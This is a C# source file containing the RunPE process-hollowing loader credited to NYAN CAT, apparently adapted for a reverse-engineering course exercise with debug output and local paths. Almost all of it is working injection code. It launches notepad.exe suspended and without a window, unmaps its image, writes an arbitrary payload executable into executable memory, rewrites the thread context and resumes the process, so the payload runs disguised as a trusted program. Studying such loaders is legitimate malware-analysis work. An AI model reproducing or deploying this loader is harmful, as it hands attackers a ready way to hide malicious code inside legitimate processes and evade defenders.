using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace RunPE
{

    /* 
           │ Author       : NYAN CAT
           │ Name         : RunPE
           │ Contact Me   : github.com/NYAN-x-CAT

           This program is distributed for educational purposes only.

        Usage:
        RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), File.ReadAllBytes("Payload Path"));

    */

    public static class Program
    {
        public static void Main(string[] args)
        {
            /*string targetPath = Path.Combine(
                RuntimeEnvironment.GetRuntimeDirectory(),
                "RegAsm.exe"
            );*/
            string targetPath = @"C:\Windows\SysWOW64\notepad.exe";
            string payloadPath = @"C:\Users\misha.kurtz\Reverse-Engineering\A02-Process-Inj-Hollowing-Code-Inj\A02_5\bin\A02_5_loaded_exe.exe";

            // 🔍 Add debug prints HERE
            Console.WriteLine($"[A02_5] Target path: {targetPath}");
            Console.WriteLine($"[A02_5] Target exists: {File.Exists(targetPath)}");
            Console.WriteLine($"[A02_5] Payload path: {payloadPath}");
            Console.WriteLine($"[A02_5] Payload exists: {File.Exists(payloadPath)}");

            if (!File.Exists(payloadPath))
            {
                Console.WriteLine($"Payload not found: {payloadPath}");
                return;
            }

            byte[] payload = File.ReadAllBytes(payloadPath);

            Console.WriteLine("[A02_5] Starting process hollowing test...");
            RunPE.Execute(targetPath, payload);
            Console.WriteLine("[A02_5] Done.");
        }
    }

    public static class RunPE
    {

        #region API delegate
        private delegate int DelegateResumeThread(IntPtr handle);


        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateWow64SetThreadContext(
            IntPtr thread,
            [In, Out] int[] context
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateSetThreadContext(
            IntPtr thread,
            [In, Out] int[] context
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateWow64GetThreadContext(
            IntPtr thread,
            [In, Out] int[] context
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateGetThreadContext(
            IntPtr thread,
            [In, Out] int[] context
        );

        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion


        #region API
        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");
        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");
        #endregion


        #region CreateAPI
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        private static T LoadApi<T>(string dllName, string functionName) where T : Delegate
        {
            IntPtr hModule = LoadLibraryA(dllName);
            if (hModule == IntPtr.Zero)
            {
                throw new Exception($"LoadLibraryA failed for {dllName}. LastError={Marshal.GetLastWin32Error()}");
            }

            IntPtr procAddress = GetProcAddress(hModule, functionName);
            if (procAddress == IntPtr.Zero)
            {
                throw new Exception($"GetProcAddress failed for {dllName}!{functionName}. LastError={Marshal.GetLastWin32Error()}");
            }

            return Marshal.GetDelegateForFunctionPointer<T>(procAddress);
        }
        #endregion


        #region Structure
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion


        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));

                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false,
                        0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi))
                        throw new Exception($"CreateProcessA failed. LastError={Marshal.GetLastWin32Error()}");

                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);

                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;

                    if (!GetThreadContext(pi.ThreadHandle, context))
                        throw new Exception($"GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");

                    int ebx = context[0x29];
                    int baseAddress = 0x0;

                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
                        throw new Exception($"ReadProcessMemory PEB image base failed. LastError={Marshal.GetLastWin32Error()} EBX=0x{ebx:X}");

                    if (imageBase == baseAddress)
                    {
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0)
                            throw new Exception($"ZwUnmapViewOfSection failed. LastError={Marshal.GetLastWin32Error()} baseAddress=0x{baseAddress:X}");
                    }

                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);

                    bool allowOverride = false;

                    int newImageBase = VirtualAllocEx(
                        pi.ProcessHandle,
                        imageBase,
                        sizeOfImage,
                        0x3000,
                        0x40
                    );

                    if (newImageBase == 0x0)
                        throw new Exception($"VirtualAllocEx failed. LastError={Marshal.GetLastWin32Error()} imageBase=0x{imageBase:X} sizeOfImage=0x{sizeOfImage:X}");

                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite))
                        throw new Exception($"WriteProcessMemory headers failed. LastError={Marshal.GetLastWin32Error()}");

                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);

                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);

                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);

                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
                                throw new Exception($"WriteProcessMemory section failed. LastError={Marshal.GetLastWin32Error()} section={I} VA=0x{virtualAddress:X} size=0x{sizeOfRawData:X}");
                        }

                        sectionOffset += 0x28;
                    }

                    byte[] pointerData = BitConverter.GetBytes(newImageBase);

                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite))
                        throw new Exception($"WriteProcessMemory PEB image base update failed. LastError={Marshal.GetLastWin32Error()} EBX=0x{ebx:X}");

                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);

                    if (allowOverride)
                        newImageBase = imageBase;

                    context[0x2C] = newImageBase + addressOfEntryPoint;

                    if (IntPtr.Size == 0x4)
                    {
                        if (!SetThreadContext(pi.ThreadHandle, context))
                            throw new Exception($"SetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
                    }
                    else
                    {
                        if (!Wow64SetThreadContext(pi.ThreadHandle, context))
                            throw new Exception($"Wow64SetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
                    }

                    if (ResumeThread(pi.ThreadHandle) == -1)
                        throw new Exception($"ResumeThread failed. LastError={Marshal.GetLastWin32Error()}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[A02_5] Failed: {ex}");
                    Console.WriteLine($"[A02_5] Last Win32 Error: {Marshal.GetLastWin32Error()}");

                    if (pi.ProcessId != 0)
                    {
                        try
                        {
                            Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                        }
                        catch { }
                    }

                    continue;
                }

                break;
            }
        }
    }

}